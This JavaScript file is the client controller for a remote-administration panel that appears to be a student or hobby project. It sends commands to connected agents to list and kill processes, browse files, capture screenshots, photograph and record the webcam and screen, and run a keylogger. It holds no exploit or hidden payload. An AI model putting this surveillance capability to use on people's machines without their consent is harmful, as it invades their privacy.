import { CONFIG } from './config.js';

export class Gateway{
    /**
     * @param {Object} callbacks
     * @param {Function} callbacks.onConnected
     * @param {Function} callbacks.onDisconnected
     * @param {Function} callbacks.onMessage
     * @param {Function} callbacks.onError 
     * @param {Function} callbacks.onAuthSuccess 
     * @param {Function} callbacks.onAgentListUpdate
     * @param {Function} callbacks.onScreenshot     
     * @param {Function} callbacks.onCamera        
     * @param {Function} callbacks.onKeylog         
     * @param {Function} callbacks.onMessage
     */

    constructor(callbacks = {}) {
        this.ws = null;
        this.callbacks = callbacks;
        this.isAuthenticated = false;
        this.machineId = this._getMachineId();
        this.targetId = 'ALL';
        this._hasTriedInsecure = false;
        this._lastCloseCode = null;

        this.ui = window.ui || { log: console.log, renderList: console.table };

        this.agentsList = [];
        this.appListCache = [];
        this.processListCache = [];
    }

    findAgentId(input) {
        if (input === 'ALL') return 'ALL';
        
        const agent = this.agentsList.find(a => 
            a.id === input || 
            a.ip === input || 
            a.machineId === input
        );

        return agent ? agent.id : null;
    }

    _getMachineId() {
        let id = localStorage.getItem(CONFIG.LOCAL_STORAGE_ID_KEY);
        if (!id) {
            const hostname = window.location.hostname || 'localhost';
            const userAgent = navigator.userAgent || 'unknown';
            const platform = navigator.platform || 'unknown';
            
            const hash = this._simpleHash(hostname + userAgent + platform);
            const shortHash = hash.toString(36).substring(0, 8).toUpperCase();
            
            id = `CLI-${hostname}-${shortHash}`;
            id = id.replace(/[^a-zA-Z0-9\-_]/g, '-').substring(0, 50);
            localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
        }
        return id;
    }

    _simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash);
    }

    connect(ip, port = CONFIG.SERVER_PORT, useSecure = true) {
        if (this.ws) {
            console.log(`[Gateway] Closing existing connection before creating new one`);
            this.ws.close();
            this.ws = null;
        }
        
        if (port === CONFIG.SERVER_PORT + 2) {
            useSecure = false;
        }
        
        if (useSecure) {
            this._hasTriedInsecure = false;
        }

        const protocol = useSecure ? 'wss' : 'ws';
        const url = `${protocol}://${ip}:${port}`;
        console.log(`[Gateway] Creating new connection to ${url}...`);

        this.ws = new WebSocket(url);

        this.ws.onopen = () => {
            console.log(`[Network] Socket opened successfully to ${url}`)
            console.log(`[Network] Waiting for user to enter password...`)

            if (this.callbacks.onConnected) {
                this.callbacks.onConnected();
            }
        };

        this.ws.onmessage = (event) => this._handleInternalMessage(event);
        
        this.ws.onclose = (event) => {
            const wasAuthenticated = this.isAuthenticated;
            const connectionId = this.clientConnectionId || 'none';
            this._lastCloseCode = event.code;
            this.isAuthenticated = false;
            
            console.log(`[Network] Socket closed. Code: ${event.code}, Reason: ${event.reason || 'Unknown'}`);
            console.log(`[Network] Was authenticated: ${wasAuthenticated}, Connection ID: ${connectionId}`);
            
            if (event.code === 1001) {
                console.log(`[Network] Connection closed normally (Going Away). This usually means:`);
                console.log(`  1. Page refresh or navigation`);
                console.log(`  2. Tab/window closed`);
                console.log(`  3. Browser initiated close`);
            
                if (wasAuthenticated && this.callbacks.onDisconnected) {
                    console.log(`[Network] Triggering onDisconnected for navigation (code 1001 but was authenticated)`);
                    this.callbacks.onDisconnected();
                } else {
                    console.log(`[Network] Not triggering onDisconnected (not authenticated or no callback)`);
                }
                return;
            } else if (event.code === 1000) {
                console.log(`[Network] Connection closed normally (code 1000). Intentional close.`);
                console.log(`[Network] Not triggering auto-reconnect for intentional close (code 1000)`);
                return;
            } else if (event.code === 1006) {
                console.error(`[Network] Connection failed abnormally. This usually means:`);
                console.error(`  1. Gateway server is not running at ${ip}:${port}`);
                console.error(`  2. SSL certificate is not trusted (self-signed)`);
                console.error(`  3. Network interruption`);
                console.error(`  → Fix: Open https://${ip}:${port} in browser first to accept certificate`);
            } else if (event.code === 1005) {
                console.warn(`[Network] Connection closed without status (code 1005). This may indicate:`);
                console.warn(`  1. Connection was closed before authentication completed`);
                console.warn(`  2. Network interruption`);
                console.warn(`  3. Server closed connection unexpectedly`);
            }
            
            if (wasAuthenticated && this.callbacks.onDisconnected) {
                this.callbacks.onDisconnected();
            } else if (!wasAuthenticated) {
                console.log(`[Network] Connection closed before authentication - not triggering disconnect callback`);
            }
        };

        this.ws.onerror = (err) => {
            console.error(`[Network] WebSocket error:`, err);
            console.error(`[Network] Cannot connect to ${url}`);
            console.error(`[Network] Possible causes:`);
            console.error(`  - Gateway server is not running`);
            console.error(`  - SSL certificate is not trusted (self-signed certificate)`);
            console.error(`  - Firewall blocking connection`);
            console.error(`[Network] Solution: Open https://${ip}:${port} in browser first to accept the certificate`);
            if (this.callbacks.onError) {
                this.callbacks.onError(err);
            }
        };
    }

    disconnect() {
        if (this.ws) {
            this.ws.close();
        }
    }

    authenticate() {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot authenticate: Socket not open.`);
            return;
            if (this.callbacks.onError) {
                this.callbacks.onError(new Error(`[Gateway] Cannot authenticate: Socket not open.`));
            }
            return;
        }

        console.log(`[Gateway] Authenticating with password...`);
        this.send(CONFIG.CMD.AUTH, {
            pass: password,
            role: 'CLIENT',
            machineId: this.machineId
        });
    }

    authenticateWithPassword(password) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.error("[Gateway] Cannot authenticate: WebSocket not open");
            if (this.callbacks.onError) {
                this.callbacks.onError(new Error("WebSocket not connected"));
            }
            return;
        }
        
        if (!password || !password.trim()) {
            console.error("[Gateway] Cannot authenticate: Password is required");
            if (this.callbacks.onError) {
                this.callbacks.onError(new Error("Password is required"));
            }
            return;
        }
        
        console.log(`[Gateway] Authenticating with password...`);
        this.send(CONFIG.CMD.AUTH, {
            pass: password.trim(),
            role: 'CLIENT',
            machineId: this.machineId
        });
    }

    send(type, data, specificTarget = null) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot send: Socket not open.`);
            return;
        }

        if (type === CONFIG.CMD.AUTH) {
            const authMsg = JSON.stringify({type, data});
            console.log(`[Gateway] Sending AUTH message: ${authMsg.substring(0, 100)}...`);
            this.ws.send(authMsg);
            console.log(`[Gateway] AUTH message sent successfully`);
            return;
        }

        if (type === CONFIG.CMD.GET_AGENTS) {
            const payload = {
                type: type,
                data: data,
                from: this.sessionId,
                to: 'ALL' 
            }
            this.ws.send(JSON.stringify(payload));
            return;
        }

        const target = specificTarget || this.targetId;
        
        if (target === 'ALL') {
            console.error(`[Gateway] Cannot send command ${type}: No agent selected. Please select an agent first.`);
            if (this.ui && this.ui.log) {
                this.ui.log('Error', `Vui lòng chọn một agent trước khi gửi lệnh ${type}`);
            }
            return;
        }

        const payload = {
            type: type,
            data: data,
            from: this.sessionId,
            to: target
        }

        this.ws.send(JSON.stringify(payload));
    }

    setTarget(input) {
        const realId = this.findAgentId(input);
        
        if (realId) {
            this.targetId = realId;
            console.log(`[Gateway] Target locked: ${realId} (Matched: ${input})`);
        } else {
            console.warn(`[Gateway] Could not find agent with Name/IP/ID: ${input}`);
            console.log("Available Agents:", this.agentsList);
        }
    }

    refreshAgents() {
        this.send(CONFIG.CMD.GET_AGENTS, {});
    }

    fetchProcessList() {
        this.send(CONFIG.CMD.PROC_LIST, "");
    }

    startProcess(id) {
        this.send(CONFIG.CMD.PROC_START, String(id));
    }

    killProcess(id) {
        this.send(CONFIG.CMD.PROC_KILL, String(id));
    }

    fetchAppList() {
        console.log('[Gateway] fetchAppList() called, sending APP_LIST request to target:', this.targetId);
        this.send(CONFIG.CMD.APP_LIST, "");
    }

    startApp(id) {
        this.send(CONFIG.CMD.APP_START, String(id));
    }

    killApp(id) {
        this.send(CONFIG.CMD.APP_KILL, String(id));
    }

    listFiles(path = "") {
        const data = typeof path === 'string' ? path : JSON.stringify({ path });
        this.send(CONFIG.CMD.FILE_LIST, data);
    }

    _handleInternalMessage(event) {
        try {
            let msg;
            try { msg = JSON.parse(event.data); } 
            catch { msg = { type: 'raw', data: event.data }; }
            const senderId = msg.from;

            switch (msg.type) {
                case CONFIG.CMD.AUTH:
                    if (msg.data && msg.data.status === 'ok') {
                        this.isAuthenticated = true;
                        this.clientConnectionId = msg.data.sessionId || this.machineId;
                        console.log(`[Gateway] Authentication successful! Session: ${this.clientConnectionId}`);
                        this.ui.log('Auth', `Success! Connected as: ${this.clientConnectionId}`, 'info');
                        if (this.callbacks.onAuthSuccess) this.callbacks.onAuthSuccess();
                        //this.refreshAgents();
                    } else {
                        console.error(`[Gateway] Auth Failed:`, msg.data);
                        this.isAuthenticated = false;

                        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                            this.ws.close(1008, 'Authentication failed');
                        }

                        if (this.callbacks.onError) {
                            this.callbacks.onError(new Error(msg.data.msg || 'Authentication failed'));
                        }
                    }
                    break;
                case CONFIG.CMD.GET_AGENTS:
                    this.agentsList = msg.data; 
                    console.table(this.agentsList);

                    if (this.callbacks.onAgentListUpdate) {
                        this.callbacks.onAgentListUpdate(msg.data);
                    } 
                    break;
                case CONFIG.CMD.PROC_LIST:
                    console.log('[Gateway] PROC_LIST received:', {
                        type: typeof msg.data,
                        isArray: Array.isArray(msg.data),
                        isObject: typeof msg.data === 'object' && msg.data !== null,
                        data: msg.data,
                        length: Array.isArray(msg.data) ? msg.data.length : (msg.data ? Object.keys(msg.data).length : 0)
                    });
                    
                    if (Array.isArray(msg.data)) {
                        this.processListCache = msg.data;
                    } else if (msg.data && typeof msg.data === 'object') {
                        if (msg.data.processes && Array.isArray(msg.data.processes)) {
                            this.processListCache = msg.data.processes;
                        } else if (msg.data.data && Array.isArray(msg.data.data)) {
                            this.processListCache = msg.data.data;
                        } else {
                            const keys = Object.keys(msg.data);
                            if (keys.length > 0 && !isNaN(keys[0])) {
                                this.processListCache = Object.values(msg.data);
                            } else {
                                this.processListCache = [];
                            }
                        }
                    } else if (typeof msg.data === 'string' && msg.data.trim()) {
                        console.log('[Gateway] Parsing PROC_LIST string format...');
                        const lines = msg.data.split('\n').filter(line => line.trim());
                        this.processListCache = lines.map((line, index) => {
                            let match = line.match(/PID:\s*(\d+)\s*\|\s*Name:\s*(.+)$/);
                            if (match) {
                                const pid = parseInt(match[1], 10);
                                const name = match[2].trim();
                                return {
                                    id: index,
                                    name: name,
                                    pid: pid,
                                    index: index
                                };
                            }
                            
                            match = line.match(/^(\d+)\.\s*PID:\s*(\d+)\s*\|\s*Name:\s*(.+)$/);
                            if (match) {
                                const id = parseInt(match[1], 10);
                                const pid = parseInt(match[2], 10);
                                const name = match[3].trim();
                                return {
                                    id: id,
                                    name: name,
                                    pid: pid,
                                    index: id
                                };
                            }
                            
                            match = line.match(/^(\d+)\.\s*Name:\s*(.+)$/);
                            if (match) {
                                const id = parseInt(match[1], 10);
                                const name = match[2].trim();
                                return {
                                    id: id,
                                    name: name,
                                    pid: null,
                                    index: id
                                };
                            }
                            
                            return {
                                id: index,
                                name: line.trim(),
                                pid: null,
                                index: index
                            };
                        });
                        console.log('[Gateway] Parsed', this.processListCache.length, 'processes from string');
                    } else {
                        this.processListCache = [];
                    }
                    
                    console.log('[Gateway] processListCache after processing:', {
                        length: this.processListCache.length,
                        sample: this.processListCache[0] || 'N/A'
                    });
                    this.ui.renderList('Process List', this.processListCache);
                    break;
                case CONFIG.CMD.APP_LIST:
                    console.log('[Gateway] APP_LIST received:', {
                        type: typeof msg.data,
                        isArray: Array.isArray(msg.data),
                        isObject: typeof msg.data === 'object' && msg.data !== null,
                        data: msg.data,
                        length: Array.isArray(msg.data) ? msg.data.length : (msg.data ? Object.keys(msg.data).length : 0)
                    });
                    
                    if (Array.isArray(msg.data)) {
                        this.appListCache = msg.data;
                    } else if (msg.data && typeof msg.data === 'object') {
                        if (msg.data.apps && Array.isArray(msg.data.apps)) {
                            this.appListCache = msg.data.apps;
                        } else if (msg.data.data && Array.isArray(msg.data.data)) {
                            this.appListCache = msg.data.data;
                        } else {
                            const keys = Object.keys(msg.data);
                            if (keys.length > 0 && !isNaN(keys[0])) {
                                this.appListCache = Object.values(msg.data);
                            } else {
                                this.appListCache = [];
                            }
                        }
                    } else if (typeof msg.data === 'string' && msg.data.trim()) {
                        console.log('[Gateway] Parsing APP_LIST string format...');
                        const lines = msg.data.split('\n').filter(line => line.trim());
                        this.appListCache = lines.map((line, index) => {
                            const match = line.match(/^(\d+)\.\s*Name:\s*(.+)$/);
                            if (match) {
                                const id = parseInt(match[1], 10);
                                const name = match[2].trim();
                                return {
                                    id: id,
                                    name: name,
                                    index: id
                                };
                            } else {
                                return {
                                    id: index,
                                    name: line.trim(),
                                    index: index
                                };
                            }
                        });
                        console.log('[Gateway] Parsed', this.appListCache.length, 'apps from string');
                    } else {
                        this.appListCache = [];
                    }
                    
                    console.log('[Gateway] appListCache after processing:', {
                        length: this.appListCache.length,
                        sample: this.appListCache[0] || 'N/A'
                    });
                    this.ui.renderList('Application List', this.appListCache);
                    break;
                case CONFIG.CMD.FILE_LIST:
                    if (msg.data && msg.data.status === 'ok' && msg.data.files) {
                        this.ui.renderFileList(msg.data.path, msg.data.files, msg.data.count);
                    } else {
                        this.ui.log('Error', msg.data?.msg || 'Failed to list files');
                    }
                    break;
                case CONFIG.CMD.PROC_START:
                case CONFIG.CMD.PROC_KILL:
                case CONFIG.CMD.APP_START:
                case CONFIG.CMD.APP_KILL:
                case CONFIG.CMD.START_KEYLOG:
                case CONFIG.CMD.STOP_KEYLOG:
                    this._handleCommandResult(msg.type, msg.data);
                    break;
                case CONFIG.CMD.SCREENSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring screenshot from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Screenshot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể chụp màn hình';
                        console.error(`[Gateway] Screenshot failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.CAM_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring camera video from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Camera video received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể ghi video webcam';
                        console.error(`[Gateway] Camera record failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.CAMSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring camera shot from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Camera shot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể chụp ảnh webcam';
                        console.error(`[Gateway] Camera shot failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.SCR_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring screen recording from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Screen recording received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể ghi màn hình';
                        console.error(`[Gateway] Screen record failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.STREAM_DATA:
                    if (msg.data && msg.data.data) {
                        if (this.callbacks.onKeylog) {
                            this.callbacks.onKeylog(msg.data.data, senderId);
                        }
                    }
                    break;
                case CONFIG.CMD.ERROR:
                    console.error("[Gateway] Server Error:", msg.data);
                    const errorMsg = typeof msg.data === 'string' ? msg.data : (msg.data?.msg || JSON.stringify(msg.data));
                    this.ui.log('Error', errorMsg);
                    if (errorMsg.includes('Authentication') || errorMsg.includes('password') || errorMsg.includes('login')) {
                        console.error("[Gateway] Authentication failed - connection will be closed");
                        console.error("[Gateway] Check AUTH_HASH in config.js matches AUTH_SECRET in Gateway");
                    }
                    break;
                default:
                    this.ui.log('Server', JSON.stringify(msg.data));
                    if(this.callbacks.onMessage) {
                    this.callbacks.onMessage(msg);
            }
            }

        } catch (e) {
            console.error('[Gateway] Error handling message: ', e);
        }
    }

    _handleCommandResult(type, data) {
        const isSuccess = data.status === 'ok';
        const logMsg = `${type}: ${data.msg} (ID: ${data.id || 'N/A'})`;

        if (isSuccess) {
            console.log(`[Success] ${logMsg}`);
            this.ui.log('System', data.msg);

            if (type.includes("APP")) this.fetchAppList();
            if (type.includes("PROC")) this.fetchProcessList();
        } else {
            console.warn(`[Failed] ${logMsg}`);
            this.ui.log('Error', data.msg);
        }
    }

    getFormattedAppList() {
        if (!Array.isArray(this.appListCache)) {
            return [];
        }
        
        return this.appListCache.map((app, index) => {
            let appId = index;
            if (app.id !== undefined && app.id !== null) {
                const numId = typeof app.id === 'number' ? app.id : parseInt(app.id, 10);
                if (!isNaN(numId) && numId >= 0) {
                    appId = numId;
                }
            }
            
            return {
                id: appId, 
                name: app.name || app.path || 'Unknown',
                status: app.status || (app.running ? 'running' : 'paused'),
                path: app.path || '',
                pid: app.pid || null
            };
        });
    }

    getFormattedProcessList() {
        if (!Array.isArray(this.processListCache)) {
            return [];
        }
        
        return this.processListCache.map((proc, index) => {
            const procId = index; 
            
            return {
                id: procId, 
                name: proc.name || proc.processName || 'Unknown',
                status: proc.status || (proc.running ? 'running' : 'paused'),
                pid: proc.pid || null,
                cpu: proc.cpu || null,
                memory: proc.memory || null
            };
        });
    }
}